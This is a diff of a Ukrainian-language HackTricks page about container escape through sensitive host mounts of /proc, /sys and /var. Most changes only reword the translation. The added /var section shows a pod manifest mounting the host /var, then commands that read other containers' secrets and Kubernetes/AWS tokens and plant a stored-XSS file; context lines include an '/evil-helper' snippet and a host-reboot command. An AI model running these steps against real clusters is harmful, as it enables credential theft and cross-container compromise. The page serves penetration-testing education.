@@ -2,20 +2,20 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Відкриття `/proc` та `/sys` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розкриття інформації. Ці каталоги містять чутливі файли, які, якщо неправильно налаштовані або доступні несанкціонованому користувачу, можуть призвести до втечі з контейнера, модифікації хоста або надати інформацію, що сприяє подальшим атакам. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.
+Відкриття `/proc`, `/sys` та `/var` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розкриття інформації. Ці каталоги містять чутливі файли, які, якщо неправильно налаштовані або доступні несанкціонованому користувачу, можуть призвести до втечі з контейнера, модифікації хоста або надати інформацію, що сприяє подальшим атакам. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.
 
-**Додаткові деталі про кожну потенційну уразливість можна знайти в** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Ви можете знайти додаткові деталі кожної потенційної уразливості в** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## Уразливості procfs
 
 ### `/proc/sys`
 
-Цей каталог дозволяє доступ для зміни змінних ядра, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, які викликають занепокоєння:
+Цей каталог дозволяє змінювати змінні ядра, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, які викликають занепокоєння:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Дозволяє визначити програму для виконання при генерації файлу ядра з першими 128 байтами як аргументами. Це може призвести до виконання коду, якщо файл починається з каналу `|`.
+- Дозволяє визначити програму для виконання при генерації core-файлу з перші 128 байт як аргументи. Це може призвести до виконання коду, якщо файл починається з пайпа `|`.
 - **Приклад тестування та експлуатації**:
 
 ```bash
@@ -32,7 +32,7 @@ sleep 5 && ./crash & # Викликати обробник
 - **Приклад перевірки доступу**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Перевірити доступ до modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
@@ -49,9 +49,9 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Перевірити доступ до 
 
 - Дозволяє реєструвати інтерпретатори для неоригінальних бінарних форматів на основі їх магічного номера.
 - Може призвести до підвищення привілеїв або доступу до кореневого шеллу, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
-- Відповідний експлойт та пояснення:
-- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-- Детальний посібник: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Відповідна експлуатація та пояснення:
+- [Бідний чоловік rootkit через binfmt_misc](https://github.com/toffan/binfmt_misc)
+- Детальний посібник: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Інші в `/proc`
 
@@ -72,12 +72,12 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 #### **`/proc/kmsg`**
 
 - Відкриває повідомлення з кільцевого буфера ядра.
-- Може допомогти в експлойтах ядра, витоках адрес та надати чутливу інформацію про систему.
+- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу інформацію про систему.
 
 #### **`/proc/kallsyms`**
 
 - Перераховує експортовані символи ядра та їх адреси.
-- Важливо для розробки експлойтів ядра, особливо для подолання KASLR.
+- Важливо для розробки експлуатацій для ядра, особливо для подолання KASLR.
 - Інформація про адреси обмежена, якщо `kptr_restrict` встановлено на `1` або `2`.
 - Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -85,14 +85,14 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 
 - Інтерфейс з пристроєм пам'яті ядра `/dev/mem`.
 - Історично вразливий до атак підвищення привілеїв.
-- Більше на [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Більше про [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
 - Представляє фізичну пам'ять системи у форматі ELF core.
-- Читання може призвести до витоку вмісту пам'яті хоста та інших контейнерів.
+- Читання може витікати вміст пам'яті хоста та інших контейнерів.
 - Великий розмір файлу може призвести до проблем з читанням або збоїв програмного забезпечення.
-- Детальне використання в [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Детальне використання в [Витягування /proc/kcore у 2019 році](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
@@ -106,13 +106,13 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 
 #### **`/proc/sched_debug`**
 
-- Повертає інформацію про планування процесів, обходячи захисти простору імен PID.
+- Повертає інформацію про планування процесів, обходячи захисти простору PID.
 - Відкриває імена процесів, ID та ідентифікатори cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
 - Надає інформацію про точки монтування в просторі імен монтування процесу.
-- Відкриває місцезнаходження контейнера `rootfs` або образу.
+- Відкриває місцезнаходження `rootfs` контейнера або образу.
 
 ### Уразливості `/sys`
 
@@ -126,7 +126,7 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Знаходить шлях хоста з монтування OverlayFS для контейнера
+#### Знаходить шлях хоста з OverlayFS для контейнера
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
@@ -153,7 +153,7 @@ cat /output %%%
 #### **`/sys/kernel/security`**
 
 - Містить інтерфейс `securityfs`, що дозволяє налаштування Модулів безпеки Linux, таких як AppArmor.
-- Доступ може дозволити контейнеру відключити свою MAC-систему.
+- Доступ може дозволити контейнеру вимкнути свою MAC-систему.
 
 #### **`/sys/firmware/efi/vars` та `/sys/firmware/efi/efivars`**
 
@@ -162,8 +162,97 @@ cat /output %%%
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` пропонує "без правил" інтерфейс для налагодження ядра.
+- `debugfs` пропонує інтерфейс нульових правил для налагодження ядра.
 - Історія проблем з безпекою через його необмежений характер.
+
+### Уразливості `/var`
+
+Папка хоста **/var** містить сокети виконання контейнерів та файлові системи контейнерів. Якщо цей каталог змонтовано всередині контейнера, цей контейнер отримає доступ на читання та запис до файлових систем інших контейнерів з привілеями root. Це може бути зловжито для перемикання між контейнерами, викликання відмови в обслуговуванні або створення бекдору для інших контейнерів та додатків, які в них працюють.
+
+#### Kubernetes
+
+Якщо контейнер такого типу розгорнуто з Kubernetes:
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: pod-mounts-var
+labels:
+app: pentest
+spec:
+containers:
+- name: pod-mounts-var-folder
+image: alpine
+volumeMounts:
+- mountPath: /host-var
+name: noderoot
+command: [ "/bin/sh", "-c", "--" ]
+args: [ "while true; do sleep 30; done;" ]
+volumes:
+- name: noderoot
+hostPath:
+path: /var
+```
+Всередині контейнера **pod-mounts-var-folder**:
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+XSS було досягнуто:
+
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
+
+Зверніть увагу, що контейнер НЕ потребує перезавантаження або чогось подібного. Будь-які зміни, внесені через змонтовану **/var** папку, будуть застосовані миттєво.
+
+Ви також можете замінити конфігураційні файли, двійкові файли, сервіси, файли додатків та профілі оболонки для досягнення автоматичного (або напівавтоматичного) RCE.
+
+##### Доступ до облікових даних хмари
+
+Контейнер може читати токени K8s serviceaccount або токени AWS webidentity, що дозволяє контейнеру отримати несанкціонований доступ до K8s або хмари:
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+#### Docker
+
+Експлуатація в Docker (або в розгортаннях Docker Compose) є точно такою ж, за винятком того, що зазвичай файлові системи інших контейнерів доступні під іншим базовим шляхом:
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+Storage Driver: overlay2
+Docker Root Dir: /var/lib/docker
+```
+Отже, файлові системи знаходяться під `/var/lib/docker/overlay2/`:
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+#### Примітка
+
+Фактичні шляхи можуть відрізнятися в різних налаштуваннях, тому найкраще використовувати команду **find** для
+локалізації файлових систем інших контейнерів
+
+
 
 ### Посилання
 
